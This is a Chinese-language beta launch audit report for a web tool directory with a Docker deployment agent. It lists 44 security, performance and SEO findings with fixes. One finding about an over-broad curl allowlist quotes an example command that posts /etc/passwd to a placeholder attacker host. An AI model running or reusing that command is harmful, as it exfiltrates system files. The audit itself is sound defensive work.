# Beta 上线审计报告

> 日期：2026-06-03
> 审计范围：全项目（代码 / 安全 / 性能 / SEO / CF Pages 兼容性）
> 发现问题：44 个

---

## 1. CRITICAL — 上线阻塞（8 个）

### C1 — KV Namespace IDs 为占位符

- **位置：** `wrangler.toml:10,14`
- **问题：** `DEPLOY_KV_PLACEHOLDER` 和 `WAITLIST_KV_PLACEHOLDER` 是字面占位字符串
- **影响：** 首次部署后所有 7 个 Functions API（waitlist/feedback/auth/servers/deploy）的 KV 操作全部失败
- **修复：** 在 CF 控制台创建两个 KV Namespace，获取真实 ID 替换

### C2 — 无认证强制执行，所有用户数据可互串

- **位置：**
  - `functions/api/deploy/history.ts:25` — `'anonymous'` 兜底
  - `functions/api/servers.ts:17` — `'anonymous'` 兜底
  - `functions/api/waitlist.ts:36` — 完全无认证
  - `functions/api/feedback.ts:25` — 完全无认证
  - `functions/api/auth/upgrade.ts:7` — 注释说"Protected by Cloudflare Access"但代码无强制
- **问题：** 所有 API 读取 `Cf-Access-Authenticated-User-Email` header 但缺失时降级为 `'anonymous'`。CF Access 配置前，所有用户共享同一个匿名数据桶
- **影响：** 跨用户数据泄露——部署历史、服务器列表、方案等级均可见
- **修复：** 部署前必须配置 CF Access 保护 `/api/*` 路径，或增加拒绝未认证请求的逻辑

### C3 — Agent Token 通过明文 HTTP 传输

- **位置：**
  - `src/app/dashboard/page.tsx:274,298` — 浏览器直连 `http://`
  - `functions/api/deploy/connect.ts:39` — CF Worker 转发到 `http://`
  - `functions/api/deploy/execute.ts:51` — 同上
  - `public/agent/agent.py:402` — Agent 监听 `0.0.0.0:9876` 纯 HTTP
- **问题：** Agent Token 以明文 HTTP Header 传输，网络嗅探即可窃取
- **影响：** Token 泄露 → 攻击者获得 Docker 宿主机完全控制权
- **修复：** 建议用户使用 VPN/内网，或为 Agent 配置 Nginx 反向代理 + Let's Encrypt

### C4 — 65KB tools.json 打包进客户端 JS

- **位置：** `src/data/tools.json`（66,565 字节）→ `src/lib/tools.ts:1` → `src/app/page.tsx`（客户端组件）
- **问题：** 首页的客户端 bundle 包含全部 50 个工具的完整数据
- **影响：** 慢速网络下首屏加载显著变慢（~65KB 未压缩 JS 增量）
- **修复：** 将首页拆分为 Server Component（筛选逻辑用服务端渲染），仅客户端交互部分保留 Client Component

### C5 — 首页无 generateMetadata

- **位置：** `src/app/page.tsx` — 整个文件无 metadata 导出
- **问题：** 搜索引擎抓取首页时看到的是 layout.tsx 的通用标题，无页面专属描述
- **影响：** 首页 SEO 排名潜力未发挥
- **修复：** 添加 `export const metadata` 或 `generateMetadata`

### C6 — 全站零 Canonical URL

- **位置：** 整个代码库无 `<link rel="canonical">` 或 `alternates.canonical`
- **问题：** 搜索引擎将每个 URL 视为可能的重复内容
- **影响：** SEO 权重分散，搜索排名受损
- **修复：** `layout.tsx` 添加 `metadataBase` 和 `alternates: { canonical: './' }`

### C7 — 零 Open Graph 图片

- **位置：** `src/app/layout.tsx:9-21` — OG/Twitter 标签无 `images` 字段
- **问题：** 链接分享到微信/Twitter/Facebook/Slack 时无预览图
- **影响：** 社交媒体传播效果大打折扣
- **修复：** 创建 `public/og-image.png`（1200x630），在 layout.tsx metadata 中引用

### C8 — 双 `<h1>` 标签出现在每个页面

- **位置：** `src/components/Header.tsx:41` — `<h1>GitHub 精选工具库</h1>` 在共享布局组件中
- **问题：** 每个使用 Header 的页面都会出现两个 h1（Header 的 + 页面自己的）
- **影响：** 搜索引擎混淆页面主题，SEO 信号削弱
- **修复：** Header 中的 h1 改为 `<span>` 或仅在首页渲染为 h1

---

## 2. HIGH — 影响核心体验（11 个）

### H1 — WaitlistForm 空 catch 吞掉错误

- **位置：** `src/components/WaitlistForm.tsx:28` — `} catch {}`
- **问题：** 网络请求失败时仍然 `setDone(true)`，用户以为已登记实际未存储
- **修复：** 添加错误状态提示

### H2 — 部署配置中硬编码弱密码

- **位置：** `src/lib/deploy.ts` — `changeMe123!`、`rootChangeMe123!` 等出现在多个 env_vars default 中
- **问题：** 用户不改密码就部署的话，服务使用极易猜到的密码
- **修复：** 部署向导中增加密码强度提示

### H3 — 7 处 alert() 用于错误处理

- **位置：** `src/app/dashboard/page.tsx:76,78,280,281,305,308,310`
- **问题：** iOS Safari/WebView 中 `alert()` 可能被抑制，无持久错误状态
- **修复：** 创建 Toast 组件替代 alert

### H4 — prompt() 收集敏感 Token（明文显示）

- **位置：** `src/app/dashboard/page.tsx:272,296`
- **问题：** Agent Token 在 prompt 对话框里明文显示，屏幕共享/旁人可见
- **修复：** 使用自定义 Modal + `<input type="password">` 替代

### H5 — WizardClient localStorage JSON.parse 无 try-catch

- **位置：** `src/app/deploy/[id]/wizard/WizardClient.tsx:129`
- **问题：** localStorage 数据损坏时 `JSON.parse` 抛出未捕获异常，整个向导组件崩溃白屏
- **修复：** 用 try-catch 包裹并提供降级默认值

### H6 — Clipboard API 无错误处理

- **位置：** `src/components/CopyButton.tsx:11`、`WizardClient.tsx:458,493`
- **问题：** 非 HTTPS 环境/iframe/权限拒绝时静默失败
- **修复：** try-catch + 降级到 `document.execCommand('copy')`

### H7 — WizardClient 轮询 interval 无清理

- **位置：** `src/app/deploy/[id]/wizard/WizardClient.tsx:57-85`
- **问题：** `startPolling()` 创建的 setInterval 在组件卸载时继续运行，重复调用还会创建多个并发 interval
- **修复：** 使用 useRef 防重入 + useEffect 清理函数

### H8 — Agent 白名单允许任意 curl

- **位置：** `public/agent/agent.py:36` — `["curl"]` 在 ALLOWED_COMMANDS 中
- **问题：** 白名单检查用 `startswith`，任何以 curl 开头的命令都通过（包括 `curl -X POST -d @/etc/passwd http://evil.com`）
- **修复：** 限制 curl 的具体用途，或加参数白名单

### H9 — document.activeElement DOM 直接操作

- **位置：** `src/app/dashboard/page.tsx:269-270,273,282,293-294,311`
- **问题：** React 组件直接操作 DOM（textContent/disabled），React 重渲染时状态会丢失
- **修复：** 用 React state 控制按钮文案和禁用状态

### H10 — auth.ts 标记 'use client' 导致污染

- **位置：** `src/lib/auth.ts:1` — 整个模块标记 'use client'
- **问题：** 任何导入 auth.ts 的模块都成为客户端边界，甚至连纯服务端组件也被污染
- **修复：** 拆分为 server-safe 和 client-only 两个模块

### H11 — 5 个信息页面缺失 metadata

- **位置：** `deploy/page.tsx`、`deploy/[id]/page.tsx`、`pricing/page.tsx`、`about/page.tsx`、`compare/page.tsx`
- **问题：** 这些页面对 SEO 有价值但无页面专属 title/description
- **修复：** 每个页面添加 generateMetadata

---

## 3. MEDIUM — 强烈建议修复（14 个）

### M1 — 内存频率限制器在 Worker 冷启动时重置

- **位置：** `functions/api/deploy/_middleware.ts:6-20`
- **问题：** 使用内存 Map，CF Worker 随时可能被回收，计数器归零
- **修复：** 迁移到 KV 计数或 Durable Objects（Beta 阶段可接受）

### M2 — Agent /token 端点 localhost 检查不完整

- **位置：** `public/agent/agent.py:323`
- **问题：** `127.0.1.1` 等回环地址未检查；Docker bridge 网络中来源 IP 可能被欺骗
- **修复：** 增加更多回环地址检测，或直接移除 /token 端点改用本地文件

### M3 — 无 Content-Security-Policy 等安全头

- **问题：** 全站无 CSP / X-Frame-Options / X-Content-Type-Options
- **修复：** Cloudflare Pages 添加 `_headers` 文件

### M4 — API 端点缺少 toolId/host 输入校验

- **位置：** `functions/api/deploy/execute.ts:24`、`functions/api/deploy/connect.ts:17`
- **问题：** toolId 可包含路径遍历字符，host 未验证格式
- **修复：** 增加正则校验 toolId（仅允许字母数字连字符）和 host（IP/域名格式）

### M5 — Sitemap 手动维护，缺少 lastmod

- **位置：** `public/sitemap.xml`
- **问题：** 112 个 URL 全部缺少 `<lastmod>`，搜索引擎无法判断更新频率
- **修复：** 添加 lastmod 日期或编写自动生成脚本

### M6 — 无 React Error Boundary

- **问题：** 任何组件渲染错误 → 全站白屏（如 H5 的 localStorage 损坏场景）
- **修复：** 在 layout.tsx 包裹 ErrorBoundary

### M7 — 卸载时强制删除数据卷（-v）无明确警告

- **位置：** `public/agent/agent.py:271` — `docker compose down -v`
- **问题：** 用户确认卸载时，提示只说"不可撤销"但未说明会删除照片/密码库等所有数据
- **修复：** 确认对话框明确列出"将永久删除所有数据（照片、数据库、配置）"

### M8 — CI 无依赖审计，npm 供应链风险

- **位置：** `.github/workflows/deploy-cloudflare.yml`
- **问题：** `npm ci` 前无 `npm audit`，恶意 npm 包可窃取 CLOUDFLARE_API_TOKEN
- **修复：** 添加 `npm audit --production` 步骤

### M9 — KV 数据 JSON.parse 无 schema 验证

- **位置：** `functions/api/servers.ts:28,59`、`deploy/history.ts:33` 等
- **问题：** 损坏的 KV 数据直接传给前端可能导致渲染崩溃
- **修复：** 使用 schema 验证或至少检查必需字段

### M10 — About 页面是客户端组件但无交互状态

- **位置：** `src/app/about/page.tsx:1` — `'use client'`
- **问题：** 纯静态内容页面被标记为客户端组件，增加不必要的 JS bundle
- **修复：** 移除 `'use client'` 指令

### M11 — deploy 页面内联函数重复定义

- **位置：** `src/app/deploy/page.tsx` — `getMemoryText`/`getDifficultyLabel`/`getDifficultyColor`
- **问题：** 三个纯函数在组件内每次渲染重新创建
- **修复：** 移到模块作用域

### M12 — Dashboard useEffect 无 AbortController

- **位置：** `src/app/dashboard/page.tsx:28-31`
- **问题：** 用户快速导航离开时 fetch 继续运行
- **修复：** 添加 AbortController + cleanup 函数

### M13 — 硬编码域名分散在 11 处

- **位置：** `deploy.ts:374,380`、`layout.tsx:12`、`deploy/[id]/page.tsx:113,176,178`、`WizardClient.tsx:199,457`、`functions/api/deploy/execute.ts:5` 等
- **问题：** 更换域名需修改 11 处代码
- **修复：** 统一为环境变量或常量

### M14 — 非 deploy API 无频率限制

- **位置：** `waitlist.ts`、`feedback.ts`、`auth/upgrade.ts`、`servers.ts`
- **问题：** 仅 `/api/deploy/*` 有频率限制，其他端点可被滥用
- **修复：** 将频率限制中间件扩展到所有 API 端点

---

## 4. LOW — 建议在 Beta 期间修复（11 个）

| # | 位置 | 问题 | 修复 |
|---|------|------|------|
| L1 | `dashboard/page.tsx:180` | 部署历史用 index 做 key | 用 `${record.toolId}-${record.timestamp}` |
| L2 | `compare/page.tsx:15` | URL 参数不变时不重新获取工具 | 将 toolsParam 加入 useEffect deps |
| L3 | `dashboard/page.tsx:260` | `window.open` 无 `noopener` | 设置 `window.open(url, '_blank', 'noopener,noreferrer')` |
| L4 | `agent.py:411-412` | Agent 无 systemd 集成 | install-agent.sh 创建 systemd service |
| L5 | `agent.py:28-37` | 仅白名单 `docker compose` 不支持 `docker-compose` | 增加 `docker-compose` 到白名单 |
| L6 | `deploy.ts:380` | uninstall.sh 脚本不存在 | 创建或移除 getUninstallCommand |
| L7 | Sitemap | 静态 112 URL vs 实际 123 页 | 更新或改为自动生成 |
| L8 | `tsconfig.json:39-41` | functions/ 无类型检查 | 增加独立 functions/tsconfig.json |
| L9 | `.env.example:5` | NEXT_PUBLIC_BASE_URL 定义但未被引用 | 清理或接入代码 |
| L10 | `wrangler.toml:2` | compatibility_date 过期一年 | 更新为 2026-06-01 |
| L11 | layout.tsx | 无 favicon 配置 | 添加 icons 到 metadata |

---

## 5. Cloudflare Pages 兼容性总结

### ✅ 兼容项（无需修改）

- `output: 'export'` 正确配置
- `images.unoptimized: true`（静态导出必需）
- 所有动态路由正确使用 `generateStaticParams`
- 无 SSR/ISR/revalidate 使用
- Functions 全部使用标准 Web API（Request/Response），无 Node.js API
- 无 `next/headers`、`next/cookies`、`middleware.ts`
- 构建输出 `out/` 结构正确
- package.json 依赖全部兼容 CF Pages 构建环境

### ⚠️ 需修复

- KV Namespace IDs 占位符 → 部署前必须替换
- 内存频率限制器 → 长期需迁移到 KV
- 无 `_headers` / `_routes.json` 文件 → 可选但建议

---

## 6. 审计统计

| 严重级别 | 数量 | 类别 |
|----------|------|------|
| CRITICAL | 8 | KV占位 · 认证缺失 · Token明文 · Bundle体积 · SEO缺失 × 4 |
| HIGH | 11 | 错误处理 · 硬编码密码 · alert/prompt · 轮询泄漏 · 白名单过宽 · DOM操作 · 客户端污染 · metadata缺失 |
| MEDIUM | 14 | 频率限制 · 输入校验 · 安全头 · ErrorBoundary · 数据删除提示 · CI审计 · schema验证 · 代码品位 |
| LOW | 11 | key/index · useEffect · 安全属性 · systemd · 兼容性 · 文档 |
| **总计** | **44** | |

---

## 7. Beta 上线必备修复清单（最小可行集）

这 8 个 CRITICAL 项必须在首次部署前完成：

- [ ] C1 — 创建 KV Namespace 并替换 wrangler.toml 中的 placeholder ID
- [ ] C2 — 配置 CF Access 保护 /api/* 路径，或增加未认证拒绝逻辑
- [ ] C3 — 文档中说明 Agent HTTP 风险，建议用户配置 VPN/内网访问
- [ ] C4 — 拆分首页为 Server Component（客户端仅保留交互部分）
- [ ] C5 — 首页添加 metadata
- [ ] C6 — layout.tsx 添加 metadataBase + canonical
- [ ] C7 — 创建 og-image.png（1200×630）
- [ ] C8 — Header 中 h1 改为 span（仅在首页保持 h1）
